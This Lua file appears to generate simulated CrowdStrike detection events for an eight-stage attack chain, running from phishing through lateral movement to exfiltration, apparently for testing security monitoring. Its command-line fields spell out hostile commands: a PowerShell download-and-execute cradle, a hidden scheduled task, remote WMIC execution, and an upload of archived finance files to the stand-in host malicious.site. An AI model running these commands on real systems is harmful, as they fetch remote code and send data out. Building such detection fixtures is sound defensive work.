-- Multi-Stage Attack Simulation: Lateral Movement to Data Exfiltration
-- Simulates: Initial Access -> Lateral Movement -> Data Staging -> Exfiltration
-- Version: 1.0

local function create_stage(stage_num, stage_name, tactic, technique, severity, hostname, process, cmdline)
    return {
        stage = stage_num,
        name = stage_name,
        source = "crowdstrike",
        severity = severity,
        tactic = tactic,
        technique = technique,
        payload = {
            detect_id = "cs-stage" .. stage_num .. "-" .. os.time(),
            customer_id = "default-tenant",
            timestamp = os.time() + (stage_num * 60), -- 1 min apart
            sensor = {
                hostname = hostname
            },
            process = {
                user_name = "CORP\\attacker",
                file_name = process,
                command_line = cmdline,
                sha256 = string.format("%032x", stage_num * 11111111)
            },
            tactic = tactic,
            technique = technique,
            severity = severity
        }
    }
end

local scenario = {
    name = "lateral_to_exfil",
    description = "Full attack chain: Initial access -> Lateral movement -> Data staging -> Exfiltration",
    stages = {
        -- Stage 1: Initial Access - Phishing attachment
        create_stage(1, "Initial Access", "Initial Access", "T1566", "HIGH",
            "win-workstation-01", "outlook.exe",
            "powershell -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')\""),

        -- Stage 2: Execution - Malicious payload
        create_stage(2, "Execution", "Execution", "T1059", "CRITICAL",
            "win-workstation-01", "payload.exe",
            "payload.exe -hidden -encoded JABjAGwA..."),

        -- Stage 3: Persistence - Scheduled task
        create_stage(3, "Persistence", "Persistence", "T1053", "HIGH",
            "win-workstation-01", "schtasks.exe",
            "schtasks /create /tn \"Update\" /tr \"powershell -w hidden -enc ...\" /sc daily /st 09:00"),

        -- Stage 4: Privilege Escalation
        create_stage(4, "Privilege Escalation", "Privilege Escalation", "T1548", "CRITICAL",
            "win-workstation-01", "whoami.exe",
            "whoami /priv"),

        -- Stage 5: Lateral Movement - WMI to file server
        create_stage(5, "Lateral Movement", "Lateral Movement", "T1021", "HIGH",
            "win-workstation-01", "wmiprvse.exe",
            "wmic /node:fileserver-01 process call create \"powershell -enc ...\""),

        -- Stage 6: Discovery - Find sensitive files
        create_stage(6, "Discovery", "Discovery", "T1083", "MEDIUM",
            "fileserver-01", "dir.exe",
            "dir C:\\Finance\\2024\\*.xlsx"),

        -- Stage 7: Collection - Stage sensitive data
        create_stage(7, "Collection", "Collection", "T1560", "HIGH",
            "fileserver-01", "7z.exe",
            "7z a -psecret C:\\temp\\backup.zip C:\\Finance\\2024\\*.xlsx"),

        -- Stage 8: Exfiltration - Compressed data to C2
        create_stage(8, "Exfiltration", "Exfiltration", "T1041", "CRITICAL",
            "fileserver-01", "powershell.exe",
            "Invoke-WebRequest -Uri https://malicious.site/exfil -Method POST -Body (Get-Content C:\\temp\\backup.zip -Raw)")
    }
}

return scenario